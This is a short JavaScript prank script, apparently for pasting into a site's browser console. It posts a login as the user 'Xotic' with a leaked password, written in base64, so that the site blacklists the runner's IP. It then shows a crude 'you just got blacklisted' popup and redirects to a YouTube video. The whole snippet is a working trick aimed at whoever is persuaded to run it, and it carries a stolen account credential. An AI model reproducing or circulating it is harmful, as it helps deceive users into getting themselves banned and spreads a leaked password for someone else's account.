// I think that it's safe to say not to try this on yourself.
// Blacklisting prevents from logging in on their IP. Installing/changing the IP of a VPN ends a blacklisting.
// This logs you in as Xotic with the password xoticHasManyBitches (in btoa), which was leaked and now blacklists you.
var postData = "username=Xotic&password=eG90aWNIYXNNYW55Qml0Y2hlcw==";
$.post('/api/login/', postData, function(data) {
  if (data === 'SUCCESS') {
    $("body").append(`
      <div class="errorModal">
        <div class="errorPopup">
          <text class="errorText">Error</text>
          <text class="errorReason">YOU JUST GOT BLACKLISTED LMFAO TROLLED</text>
          <button id="#okayButton" class="okayButton" onclick="location.replace('https://www.youtube.com/watch?v=AysKKdzDEIY')">Okay</button>
        </div>
      </div>`);
    document.getElementById("#okayButton").focus();
  }
});
